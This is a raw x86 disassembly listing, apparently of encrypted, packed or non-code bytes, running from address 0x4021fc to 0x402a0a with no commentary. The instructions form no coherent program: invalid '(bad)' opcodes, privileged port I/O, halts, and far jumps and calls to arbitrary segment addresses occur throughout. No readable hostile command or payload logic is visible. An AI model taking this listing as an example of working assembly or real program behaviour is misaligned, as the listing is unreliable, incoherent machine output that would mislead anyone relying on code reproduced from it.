  4021fc:	pop    esp
  4021fd:	daa    
  4021fe:	jp     0x402203
  402200:	sbb    eax,DWORD PTR [eax+0x7]
  402203:	aam    0xf7
  402205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402206:	jp     0x402279
  402208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402209:	je     0x4021e3
  40220b:	mov    edx,0x48bc779f
  402210:	push   ds
  402211:	loop   0x402241
  402213:	hlt    
  402214:	pop    edi
  402215:	mov    ch,0xa1
  402217:	adc    DWORD PTR fs:[ebx-0x2673710b],edx
  40221e:	cmp    ecx,DWORD PTR [esi+eiz*1]
  402221:	cmc    
  402222:	xchg   BYTE PTR [edi-0x6a],dh
  402225:	mov    ch,0x8c
  402227:	mov    al,ds:0x7b50ec2d
  40222c:	or     bh,BYTE PTR [ebx+eax*4+0x8313679]
  402233:	cld    
  402234:	sub    BYTE PTR ds:0xd997290f,cl
  40223a:	push   ss
  40223b:	mov    DWORD PTR [esi-0x26],edx
  40223e:	enter  0x8e6c,0xe3
  402242:	mov    BYTE PTR [esi+ecx*1-0x7e0dd6f2],0x2c
  40224a:	mov    ch,0xe5
  40224c:	test   BYTE PTR [ecx-0x70],bl
  40224f:	das    
  402250:	inc    eax
  402251:	add    DWORD PTR [ebx+edi*4],ebp
  402254:	pop    ebp
  402255:	pop    ebx
  402256:	mov    eax,ds:0xe9d9330b
  40225b:	and    eax,DWORD PTR [edi]
  40225d:	and    edx,edi
  40225f:	xor    BYTE PTR [edi+0x39],bl
  402262:	pop    es
  402263:	daa    
  402264:	sbb    edx,DWORD PTR [edi+0x2bc5f18e]
  40226a:	repnz and esi,DWORD PTR ds:0xae620f1d
  402271:	push   ebx
  402272:	out    dx,al
  402273:	dec    ebp
  402274:	and    dh,cl
  402276:	test   eax,0x7f6ef980
  40227b:	mov    ebx,0xd7521127
  402280:	inc    eax
  402281:	dec    esi
  402282:	xor    bl,BYTE PTR ds:0x21e310be
  402288:	in     eax,0xd1
  40228a:	inc    edx
  40228b:	sub    al,0xda
  40228d:	sbb    edx,0x27b982f0
  402293:	imul   eax,DWORD PTR [edx+0x3],0xfffffff8
  402297:	push   ss
  402298:	pop    edi
  402299:	ffreep st(0)
  40229b:	sbb    al,dh
  40229d:	cmp    edx,DWORD PTR [ebp+0x787a3068]
  4022a3:	jbe    0x4022cf
  4022a5:	loope  0x40230f
  4022a7:	pop    edi
  4022a8:	pop    eax
  4022a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022aa:	leave  
  4022ab:	mov    eax,0xc81b09c4
  4022b0:	outs   dx,DWORD PTR ds:[esi]
  4022b1:	std    
  4022b2:	push   edx
  4022b3:	fisubr WORD PTR [edi]
  4022b5:	push   edi
  4022b6:	neg    DWORD PTR [edx]
  4022b8:	unpckhps xmm5,XMMWORD PTR [edi-0x101b800e]
  4022bf:	jl     0x4022b7
  4022c1:	jecxz  0x40224f
  4022c3:	inc    eax
  4022c4:	dec    edi
  4022c5:	and    edi,DWORD PTR [ebx]
  4022c7:	sub    DWORD PTR [ecx],ebx
  4022c9:	adc    BYTE PTR [esi+0x5c],dl
  4022cc:	jp     0x40228a
  4022ce:	icebp  
  4022cf:	and    DWORD PTR [edi+0x9],edi
  4022d2:	add    edi,ecx
  4022d4:	test   eax,0x6e329bff
  4022d9:	repnz xor DWORD PTR [esi+0x3b],0x12c27407
  4022e1:	ja     0x402288
  4022e3:	cs (bad) 
  4022e5:	sub    ecx,esp
  4022e7:	jmp    0xe04047b9
  4022ec:	adc    ebx,esp
  4022ee:	jae    0x4022db
  4022f0:	jo     0x402332
  4022f2:	iret   
  4022f3:	shl    BYTE PTR [edx+0x11c87e1b],cl
  4022f9:	and    al,0x91
  4022fb:	mov    ebx,0x7db0ef3d
  402300:	adc    eax,0x45071165
  402305:	sbb    edx,ecx
  402307:	mov    ecx,0xf0935789
  40230c:	mov    WORD PTR [ecx+0x46],?
  40230f:	sub    dh,BYTE PTR [eax+0x524f3d41]
  402315:	xor    DWORD PTR [ecx+0x70],esi
  402318:	lock adc eax,0xcbb0ce62
  40231e:	(bad)  
  40231f:	jl     0x40232e
  402321:	iret   
  402322:	dec    ebx
  402323:	dec    esp
  402324:	call   0xa91e:0x87f145f
  40232b:	ret    
  40232c:	cwde   
  40232d:	mov    esp,DWORD PTR [edi-0x44]
  402330:	xchg   BYTE PTR [esi],bh
  402332:	imul   esi,esp,0xffffffd4
  402335:	out    dx,al
  402336:	xchg   DWORD PTR [edx+0x68],ebp
  402339:	adc    bh,bh
  40233b:	fs icebp 
  40233d:	sbb    al,BYTE PTR [ebx+edx*2-0x16fc4b10]
  402344:	mov    bl,0x19
  402346:	dec    edx
  402347:	lea    edx,[eax+eiz*4]
  40234a:	inc    eax
  40234b:	aad    0xe4
  40234d:	jo     0x40232b
  40234f:	sub    ch,BYTE PTR [esi+0x21ebaef2]
  402355:	mov    ch,0xfa
  402357:	sbb    edi,edi
  402359:	aas    
  40235a:	leave  
  40235b:	mov    eax,ds:0xa5ac93f3
  402360:	shl    BYTE PTR [esi-0x26],1
  402363:	dec    esi
  402364:	ins    DWORD PTR es:[edi],dx
  402365:	push   0x93c822f9
  40236a:	mov    ecx,0x37074797
  40236f:	aas    
  402370:	add    DWORD PTR [ebp+0x7d],ecx
  402373:	imul   BYTE PTR [ecx+ebp*2+0x3795256c]
  40237a:	mov    al,0xc1
  40237c:	inc    ebx
  40237d:	push   esi
  40237e:	(bad)  
  40237f:	pop    ecx
  402380:	inc    edi
  402381:	(bad)  
  402382:	mov    eax,ds:0x6c87fd4a
  402387:	mov    al,0x4e
  402389:	dec    esp
  40238a:	adc    eax,0xa42c6a7d
  40238f:	push   cs
  402390:	daa    
  402391:	loopne 0x40235d
  402393:	pop    esi
  402394:	call   DWORD PTR [esi]
  402396:	push   0x45663e93
  40239b:	jle    0x40233a
  40239d:	cmp    bh,0x2c
  4023a0:	clc    
  4023a1:	out    dx,al
  4023a2:	sub    al,0x4a
  4023a4:	dec    esp
  4023a5:	mov    BYTE PTR [ecx],bl
  4023a7:	xchg   BYTE PTR [ebp+eax*4+0x7b44615f],bh
  4023ae:	sahf   
  4023af:	cmp    eax,eax
  4023b1:	call   0x4f047d9a
  4023b6:	adc    edx,eax
  4023b8:	or     DWORD PTR [edx+edi*4],edi
  4023bb:	dec    esi
  4023bc:	push   es
  4023bd:	cmp    esi,DWORD PTR [esi-0x20]
  4023c0:	cmp    DWORD PTR [esi-0x8fd911f],edx
  4023c6:	out    dx,al
  4023c7:	repz retf 
  4023c9:	sbb    DWORD PTR [esi+0x3b6b8f98],ebx
  4023cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023d0:	mov    dh,dl
  4023d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d3:	mov    ?,WORD PTR [ebx]
  4023d5:	xchg   edi,eax
  4023d6:	mul    BYTE PTR [esp+edx*8+0x3941b3e7]
  4023dd:	pusha  
  4023de:	mov    BYTE PTR [ecx+eiz*1+0x23a407fc],ah
  4023e5:	jmp    0xd571:0x8513f851
  4023ec:	test   eax,0x51c0f528
  4023f1:	das    
  4023f2:	pushf  
  4023f3:	int    0x72
  4023f5:	scas   eax,DWORD PTR es:[edi]
  4023f6:	pop    esi
  4023f7:	fidiv  DWORD PTR [ecx-0x69cf5429]
  4023fd:	int3   
  4023fe:	jmp    0x40245c
  402400:	shl    edx,1
  402402:	in     eax,0xcb
  402404:	ss retf 
  402406:	loope  0x40243b
  402408:	out    dx,al
  402409:	add    DWORD PTR [ebx-0x17],ebx
  40240c:	fidiv  DWORD PTR [edx+0x4c884edd]
  402412:	or     DWORD PTR [esi],0xffffffdb
  402415:	pop    esi
  402416:	xor    DWORD PTR [ecx+0x2ea41939],edx
  40241c:	push   edi
  40241d:	inc    edx
  40241e:	clc    
  40241f:	push   0xccf3c39a
  402424:	or     esp,ecx
  402426:	in     al,dx
  402427:	popa   
  402428:	nop
  402429:	gs out 0x62,eax
  40242c:	dec    ebx
  40242d:	ins    DWORD PTR es:[edi],dx
  40242e:	int3   
  40242f:	inc    edx
  402430:	mov    dl,BYTE PTR [eax+0x1]
  402433:	stc    
  402434:	jl     0x4023d0
  402436:	push   es
  402437:	scas   al,BYTE PTR es:[edi]
  402438:	mov    esp,0x7e1254a7
  40243d:	pop    ecx
  40243e:	mov    esi,DWORD PTR [ecx+0x2686cbfc]
  402444:	pop    edx
  402445:	xor    al,0xa9
  402447:	aam    0xf9
  402449:	and    dh,ch
  40244b:	(bad)  
  40244c:	pop    edi
  40244d:	dec    ebx
  40244e:	inc    ebp
  40244f:	(bad)  
  402450:	adc    DWORD PTR [ebp+0x25],ebx
  402453:	mov    bl,0xe8
  402455:	imul   ebx,DWORD PTR [esi+eax*4-0x15],0xc9f17a15
  40245d:	fucomp st(6)
  40245f:	int    0x8a
  402461:	dec    eax
  402462:	mov    ebp,0x1c585709
  402467:	sbb    DWORD PTR [eax+0x3ed9f53f],ebp
  40246d:	fstp   QWORD PTR [ecx+edx*2-0x5fabbb5b]
  402474:	sbb    ah,bl
  402476:	cdq    
  402477:	fstp   QWORD PTR [ecx+0x1c]
  40247a:	jmp    0x528a:0xa716f997
  402481:	and    ax,0xc384
  402485:	call   0x2ed:0xdd78a914
  40248c:	fwait
  40248d:	sbb    al,0xe2
  40248f:	popf   
  402490:	add    eax,DWORD PTR [ebx-0x6d0e8235]
  402496:	xchg   DWORD PTR [ebx],ebx
  402498:	stc    
  402499:	inc    ebp
  40249a:	lock mov ebp,0x1b944e65
  4024a0:	call   0x16407e9e
  4024a5:	xchg   esp,eax
  4024a6:	jbe    0x402474
  4024a8:	xchg   BYTE PTR [edx-0x30],bl
  4024ab:	mov    al,0x18
  4024ad:	shr    BYTE PTR [eax-0x6],cl
  4024b0:	mov    ebx,0xc5ea3fe9
  4024b5:	mov    dl,0xeb
  4024b7:	cmc    
  4024b8:	and    eax,0x15792788
  4024bd:	fidiv  WORD PTR [edi]
  4024bf:	or     ecx,DWORD PTR [esi+eiz*1]
  4024c2:	push   cs
  4024c3:	sbb    edi,eax
  4024c5:	pop    edx
  4024c6:	push   eax
  4024c7:	sbb    DWORD PTR [eax],0x21
  4024ca:	xchg   ebp,eax
  4024cb:	sbb    al,0x86
  4024cd:	js     0x402453
  4024cf:	jnp    0x402469
  4024d1:	rcl    DWORD PTR [eax+edx*1-0x68],1
  4024d5:	sbb    al,0x61
  4024d7:	loope  0x402525
  4024d9:	inc    esp
  4024da:	loopne 0x40247d
  4024dc:	jae    0x40254e
  4024de:	scas   eax,DWORD PTR es:[edi]
  4024df:	fidiv  DWORD PTR [edi+0x20c637c1]
  4024e5:	shl    BYTE PTR [eax+0x2a2c3f52],1
  4024eb:	or     BYTE PTR [edx],dh
  4024ed:	adc    ch,BYTE PTR [esp+edx*1+0x7d]
  4024f1:	enter  0x5df4,0x9c
  4024f5:	sub    al,BYTE PTR [eax+edx*4+0x67]
  4024f9:	repnz ffree st(1)
  4024fc:	cmp    BYTE PTR [ebp+0x31],dh
  4024ff:	lahf   
  402500:	jecxz  0x402483
  402502:	stos   DWORD PTR es:[edi],eax
  402503:	ret    
  402504:	mov    ecx,0xc63fb72e
  402509:	pop    ebp
  40250a:	adc    al,0x9a
  40250c:	or     DWORD PTR ds:0x316e72e2,edx
  402512:	xlat   BYTE PTR ds:[ebx]
  402513:	not    BYTE PTR fs:[ebx]
  402516:	je     0x4024ed
  402518:	add    DWORD PTR [edx-0x73],edx
  40251b:	dec    eax
  40251c:	nop
  40251d:	sub    BYTE PTR [esi-0x74],dh
  402520:	out    0xdb,eax
  402522:	stos   DWORD PTR es:[edi],eax
  402523:	popf   
  402524:	push   0xe0880f35
  402529:	inc    esp
  40252a:	loop   0x402525
  40252c:	lock scas al,BYTE PTR es:[edi]
  40252e:	xchg   ebp,eax
  40252f:	or     BYTE PTR [ebx-0x7f],0xc5
  402533:	cmp    BYTE PTR [eax+0x5e],0x9
  402537:	mov    BYTE PTR [esi+0x398ddc1a],0x5e
  40253e:	pop    esi
  40253f:	xchg   edi,eax
  402540:	add    BYTE PTR [ebx-0x1e3b8d0d],bh
  402546:	mov    al,0xd7
  402548:	sbb    eax,0xb092c3ad
  40254d:	icebp  
  40254e:	test   BYTE PTR [ebx],dl
  402550:	dec    edx
  402551:	xchg   DWORD PTR [ecx+0x2f666bd1],ebp
  402557:	int3   
  402558:	fmul   st(4),st
  40255a:	pushf  
  40255b:	jg     0x402586
  40255d:	shl    ah,1
  40255f:	inc    edi
  402560:	inc    edx
  402561:	dec    ebp
  402562:	inc    esi
  402563:	mov    bl,0xb2
  402565:	mov    WORD PTR [ebx],?
  402567:	mov    bh,dh
  402569:	push   ebx
  40256b:	adc    eax,0x79d5ac82
  402570:	in     al,0x23
  402572:	data16 jecxz 0x40250e
  402575:	pop    edx
  402576:	ss push ebx
  402578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402579:	jae    0x402549
  40257b:	not    bl
  40257d:	xchg   ecx,eax
  40257e:	(bad)  
  40257f:	jns    0x40251f
  402581:	cmp    edi,DWORD PTR [esi+0x6efbf83a]
  402587:	fiadd  WORD PTR ds:0x4e19fa1c
  40258d:	ins    BYTE PTR es:[edi],dx
  40258e:	adc    dh,0xfa
  402591:	nop
  402592:	lds    esp,FWORD PTR [esi+0x25fca6be]
  402598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402599:	ins    BYTE PTR es:[edi],dx
  40259a:	and    al,0xef
  40259c:	shl    DWORD PTR [edx+0x2f],1
  40259f:	xchg   ebp,eax
  4025a0:	mov    ah,BYTE PTR [esi-0x34]
  4025a3:	push   eax
  4025a4:	mov    cl,0x1d
  4025a6:	js     0x40252e
  4025a8:	data16 loope 0x402536
  4025ab:	push   0x0
  4025ad:	mov    bh,0xa5
  4025af:	push   esi
  4025b0:	pop    ecx
  4025b1:	and    dl,al
  4025b3:	inc    cx
  4025b5:	(bad)  
  4025b6:	jmp    0x520a:0x8ffa7160
  4025bd:	dec    esi
  4025be:	(bad)  
  4025bf:	(bad)  
  4025c0:	ss jecxz 0x402574
  4025c3:	jno    0x40256d
  4025c5:	add    ecx,ebp
  4025c7:	shr    BYTE PTR [ebx-0x5ae1622e],cl
  4025cd:	repnz mov eax,DWORD PTR [ecx-0x49]
  4025d1:	inc    edx
  4025d2:	dec    esp
  4025d3:	loope  0x4025c7
  4025d5:	addr16 mov dh,0x87
  4025d8:	inc    ebp
  4025d9:	push   ss
  4025da:	into   
  4025db:	(bad)  
  4025dc:	pushf  
  4025dd:	mov    edx,0x8ffc3ec9
  4025e2:	les    ecx,FWORD PTR [esp+edi*4]
  4025e5:	inc    ebp
  4025e6:	mov    WORD PTR ds:[ecx],ds
  4025e9:	sbb    eax,0x2a18fde
  4025ee:	retf   
  4025ef:	mov    ah,0x6f
  4025f1:	jbe    0x402641
  4025f3:	sbb    BYTE PTR [eax],0x3e
  4025f6:	mov    edi,DWORD PTR [ebx]
  4025f8:	bound  eax,QWORD PTR [eax+0x34b6a42e]
  4025fe:	sub    al,0xda
  402600:	das    
  402601:	test   bh,0x81
  402604:	xor    esi,DWORD PTR [esi]
  402606:	das    
  402607:	jb     0x40266b
  402609:	mov    al,ds:0x6ff26966
  40260e:	mov    ecx,0x2fe23ecd
  402613:	(bad)  
  402614:	inc    edx
  402615:	mov    ecx,0xb92cb182
  40261a:	or     ecx,DWORD PTR [esi+0x32]
  40261d:	dec    edi
  40261e:	(bad)  
  40261f:	leave  
  402620:	add    eax,0x48685741
  402625:	es xchg ebx,eax
  402627:	cmp    ch,BYTE PTR [esi-0xe2e5ed9]
  40262d:	adc    DWORD PTR es:[ebp+0x4c296c79],0x6e
  402635:	stos   DWORD PTR es:[edi],eax
  402636:	outs   dx,DWORD PTR ds:[esi]
  402637:	ins    DWORD PTR es:[edi],dx
  402638:	das    
  402639:	dec    edi
  40263a:	idiv   al
  40263c:	es jg  0x402662
  40263f:	mov    al,dl
  402641:	icebp  
  402642:	mov    dh,0x51
  402644:	push   es
  402645:	jg     0x40266e
  402647:	repz xchg di,ax
  40264a:	xor    al,0x7b
  40264c:	mov    edx,DWORD PTR [eax-0x78]
  40264f:	pop    edi
  402650:	nop
  402651:	in     al,dx
  402652:	mov    BYTE PTR es:[ecx-0x2f],ch
  402656:	or     edi,ebp
  402658:	push   cs
  402659:	outs   dx,DWORD PTR ds:[esi]
  40265a:	outs   dx,BYTE PTR ds:[esi]
  40265b:	dec    eax
  40265c:	mov    edi,0xe5e72c66
  402661:	jg     0x4026b5
  402663:	ins    DWORD PTR es:[edi],dx
  402664:	imul   edx,DWORD PTR [ebx],0xc5c96a85
  40266a:	jp     0x402682
  40266c:	into   
  40266d:	pushf  
  40266e:	cmp    eax,0xc3cfd0ee
  402673:	lock pop ecx
  402675:	xchg   ebx,ecx
  402677:	mov    WORD PTR [eax],cs
  402679:	shr    esp,1
  40267b:	sbb    BYTE PTR [esp+ecx*4],al
  40267e:	inc    DWORD PTR [edx-0x74d43e65]
  402684:	jmp    0xaed9bb0a
  402689:	into   
  40268a:	jmp    0x610e2e16
  40268f:	inc    edi
  402690:	push   ebp
  402691:	push   edx
  402692:	mov    BYTE PTR [eax],0xeb
  402695:	adc    ebx,ecx
  402697:	sbb    al,0xf1
  402699:	push   0xffffffb9
  40269b:	aas    
  40269c:	dec    ebx
  40269d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269e:	mov    eax,ds:0xd8a5a803
  4026a3:	cmp    eax,0xf529435
  4026a8:	jno    0x4026f6
  4026aa:	ret    
  4026ab:	sbb    DWORD PTR [ebp+0x595a43af],edx
  4026b1:	fist   WORD PTR [edi]
  4026b3:	iret   
  4026b4:	jmp    0x4026ed
  4026b6:	ficomp DWORD PTR [ebp+0x39]
  4026b9:	das    
  4026ba:	pop    ss
  4026bb:	xchg   esp,eax
  4026bc:	hlt    
  4026bd:	push   eax
  4026be:	pusha  
  4026bf:	dec    eax
  4026c0:	es je  0x4026fd
  4026c3:	mov    WORD PTR [ebp-0x2c21214a],?
  4026c9:	add    DWORD PTR [esi-0x1],ebx
  4026cc:	in     al,dx
  4026cd:	pop    es
  4026ce:	xor    eax,0x6605d7e8
  4026d3:	les    ecx,FWORD PTR fs:[ecx+0x43]
  4026d7:	and    BYTE PTR [ebx+0x51aa821b],ch
  4026dd:	mov    eax,0xb4ccad8d
  4026e2:	xor    al,0xab
  4026e4:	and    DWORD PTR [ebp+0x63],ebp
  4026e7:	ret    
  4026e8:	rcr    BYTE PTR [ecx+0x6da2a053],0x21
  4026ef:	push   0xffffffad
  4026f1:	ja     0x4026d9
  4026f3:	lea    ebp,[edi]
  4026f5:	stc    
  4026f6:	xor    ecx,DWORD PTR ds:[edx+esi*8-0x3f]
  4026fb:	(bad)  
  4026fd:	push   esi
  4026fe:	dec    edx
  4026ff:	in     al,dx
  402700:	loopne 0x4026ef
  402702:	jmp    0x4026c9
  402704:	adc    eax,0xe8b6349f
  402709:	ror    BYTE PTR [ecx*2-0x5ad5241c],0x43
  402711:	lods   eax,DWORD PTR ds:[esi]
  402712:	mov    edx,0x18cda54b
  402717:	add    al,0x95
  402719:	add    al,0x7c
  40271b:	adc    al,0x5c
  40271d:	jle    0x402766
  40271f:	cli    
  402720:	add    BYTE PTR [edi-0x6a],0x94
  402724:	in     eax,dx
  402725:	pusha  
  402726:	fmul   QWORD PTR [ebx]
  402728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402729:	sbb    ebp,DWORD PTR [edi-0x597d94c1]
  40272f:	lahf   
  402730:	dec    ebp
  402731:	jne    0x402709
  402733:	jns    0x40271f
  402735:	(bad)  
  402737:	fild   QWORD PTR [edx]
  402739:	call   0xe310:0x2b2fe8af
  402740:	jg     0x40278e
  402742:	loop   0x4026c4
  402744:	shl    BYTE PTR [ecx-0x2a99bc9d],cl
  40274a:	jo     0x402723
  40274c:	scas   eax,DWORD PTR es:[edi]
  40274d:	xor    eax,0x55e4d19b
  402752:	pop    eax
  402753:	mov    ds:0x6a3b5900,eax
  402758:	push   ds
  402759:	std    
  40275a:	out    dx,eax
  40275b:	mov    esi,0x40e3eeb
  402760:	mov    esi,0xa680b097
  402765:	in     eax,dx
  402766:	add    esp,DWORD PTR [ebp-0x6784c584]
  40276c:	dec    eax
  40276d:	or     eax,0xaf87880b
  402772:	push   0xffffffe6
  402774:	and    bl,BYTE PTR [ebp-0x7474ec90]
  40277a:	fisttp WORD PTR cs:[edx-0x51d92349]
  402781:	fwait
  402782:	les    esi,FWORD PTR [edx]
  402784:	mov    ebx,DWORD PTR ds:0x12fc3e3e
  40278a:	mov    ebp,0x14f38761
  40278f:	call   0xebc7:0x1d7975a4
  402796:	dec    ecx
  402797:	out    0x3a,al
  402799:	cmp    BYTE PTR [ecx+eiz*4+0x44],bh
  40279d:	in     eax,dx
  40279e:	pushf  
  40279f:	jnp    0x40274c
  4027a1:	aaa    
  4027a2:	ret    0x567b
  4027a5:	ins    DWORD PTR es:[edi],dx
  4027a6:	mov    edi,0xb27ee1eb
  4027ab:	(bad)  
  4027ac:	xchg   ebx,eax
  4027ad:	in     eax,dx
  4027ae:	xchg   ebp,eax
  4027af:	jb     0x4027a3
  4027b1:	pushf  
  4027b2:	mov    dh,0x8c
  4027b4:	add    ecx,DWORD PTR [ecx+0x4bc0e1b]
  4027ba:	pop    ecx
  4027bb:	lock sar DWORD PTR [edi+0x13],1
  4027bf:	ins    DWORD PTR es:[edi],dx
  4027c0:	add    BYTE PTR [ebx+0x73],0xb4
  4027c4:	dec    edx
  4027c5:	sbb    edx,DWORD PTR [esi]
  4027c7:	sub    BYTE PTR [edi+eax*2-0x2d],al
  4027cb:	mov    esp,0x8de02fbe
  4027d0:	loope  0x40283c
  4027d2:	shl    DWORD PTR [esi],cl
  4027d4:	xchg   edi,eax
  4027d5:	add    al,0x91
  4027d7:	push   ds
  4027d8:	or     DWORD PTR [eax-0x3b],eax
  4027db:	dec    ecx
  4027dc:	push   es
  4027dd:	fisubr DWORD PTR [ecx]
  4027df:	retf   0xf06d
  4027e2:	dec    ebp
  4027e3:	mov    cl,0xef
  4027e5:	mov    BYTE PTR [edi+eax*2],al
  4027e8:	or     DWORD PTR [ebp+0x2258211],0xc4658df2
  4027f2:	imul   edx,esi,0xffffffe3
  4027f5:	out    0x26,al
  4027f7:	repz out dx,eax
  4027f9:	arpl   WORD PTR [esi-0x70],cx
  4027fc:	add    al,0xd3
  4027fe:	jo     0x4027b7
  402800:	sub    ecx,eax
  402802:	in     al,dx
  402803:	mov    ebp,0xe14cb1ea
  402808:	rcl    esp,1
  40280a:	in     al,dx
  40280b:	jg     0x402877
  40280d:	push   0x30
  40280f:	push   0x7db724e9
  402814:	mov    ?,esi
  402816:	neg    DWORD PTR [ecx+0xe]
  402819:	pop    esi
  40281a:	imul   ebx,DWORD PTR [eax-0x125c98d4],0xffffffc6
  402821:	les    eax,FWORD PTR [esi]
  402823:	cmc    
  402824:	sub    DWORD PTR [ecx-0x514ef64f],ebp
  40282a:	lods   al,BYTE PTR ds:[esi]
  40282b:	xchg   edi,eax
  40282c:	scas   eax,DWORD PTR es:[edi]
  40282d:	(bad)  
  40282e:	sbb    eax,0xe1c32cee
  402833:	fstp   DWORD PTR [esi]
  402835:	jle    0x402846
  402837:	sbb    eax,0x5329c0b7
  40283c:	(bad)  
  40283d:	xor    esp,ebx
  40283f:	scas   al,BYTE PTR es:[edi]
  402840:	inc    ebx
  402841:	in     al,0x85
  402843:	dec    ebp
  402844:	dec    ebp
  402845:	or     ch,BYTE PTR [ecx]
  402847:	mov    ch,0xea
  402849:	adc    al,0xc3
  40284b:	push   cs
  40284c:	dec    edx
  40284d:	inc    edx
  40284e:	jns    0x402840
  402850:	cmp    eax,0x51149537
  402855:	mov    al,ds:0x4fbe6986
  40285a:	js     0x40286b
  40285c:	iret   
  40285d:	and    al,0xfc
  40285f:	out    dx,eax
  402860:	push   esi
  402861:	push   0x7e
  402863:	dec    ebp
  402864:	mov    ebp,0xbf71ca48
  402869:	xchg   esp,eax
  40286a:	xchg   ebx,eax
  40286b:	stc    
  40286c:	rcl    DWORD PTR [edi+0x7e],0x7
  402870:	add    DWORD PTR [edi+0x70],edi
  402873:	imul   ebp,ebp,0xffffffc3
  402876:	and    DWORD PTR [eax-0x3e],0xb7eea6ba
  40287d:	data16 mov bp,0x58bd
  402882:	adc    edi,DWORD PTR [ebp-0xf]
  402885:	mov    ebp,ebx
  402887:	aam    0x71
  402889:	leave  
  40288a:	inc    esp
  40288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40288c:	repz pop esi
  40288e:	fdiv   DWORD PTR [ebx+ebp*8]
  402891:	or     DWORD PTR ss:0x34e683fa,0x2b667c83
  40289c:	test   BYTE PTR [ecx],dh
  40289e:	mov    edx,0x1344ab55
  4028a3:	xchg   edx,ebx
  4028a5:	push   eax
  4028a6:	inc    al
  4028a8:	call   0xfe43:0x706e6dd5
  4028af:	sbb    eax,0x24462100
  4028b4:	sbb    eax,0xd96093c9
  4028b9:	(bad)  
  4028ba:	mov    esp,0x2f3c2ee0
  4028bf:	mov    eax,0x29a45673
  4028c4:	mov    BYTE PTR [edi-0x3c330720],bl
  4028ca:	and    bl,bh
  4028cc:	popa   
  4028cd:	cmp    bh,dh
  4028cf:	je     0x402856
  4028d1:	inc    ebx
  4028d2:	push   es
  4028d3:	loopne 0x402924
  4028d5:	mov    cl,0x4
  4028d7:	jmp    0x402900
  4028d9:	cmp    BYTE PTR [ecx],dl
  4028db:	and    DWORD PTR [ecx+0x35],0x292f7454
  4028e2:	mov    ebp,0xdb9405d3
  4028e7:	jae    0x40288b
  4028e9:	fimul  WORD PTR [ebp-0xb]
  4028ec:	pop    esp
  4028ed:	adc    eax,0x230ff72f
  4028f2:	clc    
  4028f3:	push   es
  4028f4:	mov    eax,ds:0x9e42fb90
  4028f9:	add    BYTE PTR [ebx],bl
  4028fb:	iret   
  4028fc:	cmp    DWORD PTR [esi+0x9],0xfffffff7
  402900:	inc    ecx
  402901:	jge    0x402938
  402903:	popf   
  402904:	rcr    BYTE PTR [edx+0x32f66721],1
  40290a:	(bad)  
  40290b:	sbb    eax,0x9a901086
  402910:	jecxz  0x4028da
  402912:	xchg   esi,eax
  402913:	in     al,dx
  402914:	into   
  402915:	jecxz  0x4028eb
  402917:	jl     0x4028a4
  402919:	inc    edi
  40291a:	dec    eax
  40291b:	and    eax,0xba074a7a
  402920:	push   eax
  402921:	pusha  
  402922:	pop    esi
  402923:	jae    0x4028f7
  402925:	xor    DWORD PTR ds:0xf9d08eee,0xe
  40292c:	and    ecx,esi
  40292e:	int    0xf
  402930:	jge    0x402915
  402932:	mov    cl,0xdb
  402934:	pop    ebp
  402935:	lock sti 
  402937:	add    DWORD PTR [ebp+eax*8+0x5a],edx
  40293b:	sar    eax,1
  40293d:	add    bh,BYTE PTR [esi-0x7e]
  402940:	mov    dl,0xc8
  402942:	in     eax,0x39
  402944:	(bad)  
  402945:	fstp   TBYTE PTR [edi]
  402947:	push   0x35
  402949:	ficom  DWORD PTR ds:0x6a87e6bc
  40294f:	retf   
  402950:	push   eax
  402951:	fnstsw WORD PTR [esi]
  402953:	inc    esp
  402954:	sbb    eax,0x66dec1f5
  402959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40295a:	push   ebx
  40295b:	mov    ebx,0x5973eef3
  402960:	cld    
  402961:	mov    ebp,0x94537104
  402966:	push   ecx
  402967:	push   edx
  402968:	sub    dl,0xc0
  40296b:	mov    al,ds:0xf0231234
  402970:	sub    bh,BYTE PTR [edx+0xe2bd0c7]
  402976:	sub    al,0x47
  402978:	mov    edx,0x8904953
  40297d:	imul   esp,DWORD PTR ds:0x1ba6d311,0x78
  402984:	(bad)  
  402985:	jno    0x4029b1
  402987:	jle    0x4029cc
  402989:	or     DWORD PTR [edx],ebx
  40298b:	mov    esp,0x93e88b7f
  402990:	push   edi
  402991:	jmp    0x8ab1:0x8a87b157
  402998:	test   BYTE PTR [edx+0x44],ch
  40299b:	sahf   
  40299c:	adc    eax,0x7df90607
  4029a1:	cmp    al,0xe6
  4029a3:	pop    eax
  4029a4:	or     eax,DWORD PTR [ebp-0x4e8cedec]
  4029aa:	ds je  0x40296b
  4029ad:	dec    esi
  4029ae:	inc    eax
  4029af:	jns    0x402990
  4029b1:	cld    
  4029b2:	sub    dl,BYTE PTR [ebx+0x36]
  4029b5:	nop
  4029b6:	xor    ecx,esp
  4029b8:	es cli 
  4029ba:	and    eax,0xd38bd065
  4029bf:	into   
  4029c0:	cmp    esi,0x17
  4029c3:	push   ecx
  4029c4:	pop    ds
  4029c5:	out    0xcb,al
  4029c7:	gs jae 0x402961
  4029ca:	sub    bh,bl
  4029cc:	outs   dx,DWORD PTR ds:[esi]
  4029cd:	cmp    al,0x24
  4029cf:	repnz and ecx,ebx
  4029d2:	mov    esi,0x164b8399
  4029d7:	fmul   st(3),st
  4029d9:	cmp    al,0x48
  4029db:	aas    
  4029dc:	push   ds
  4029dd:	sbb    al,0x22
  4029df:	xchg   DWORD PTR [ecx-0x3b147338],edi
  4029e5:	bt     DWORD PTR [ebx-0x2f],ecx
  4029e9:	fmul   QWORD PTR ds:[ebx+ecx*1]
  4029ed:	addr16 or eax,0xc5626943
  4029f3:	iret   
  4029f4:	push   0x6768fd93
  4029f9:	ret    
  4029fa:	cli    
  4029fb:	jb     0x4029c6
  4029fd:	jae    0x402a70
  4029ff:	push   0xbf52caf4
  402a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a05:	xor    eax,0x6c09aa9
  402a0a:	loope  0x4029fb
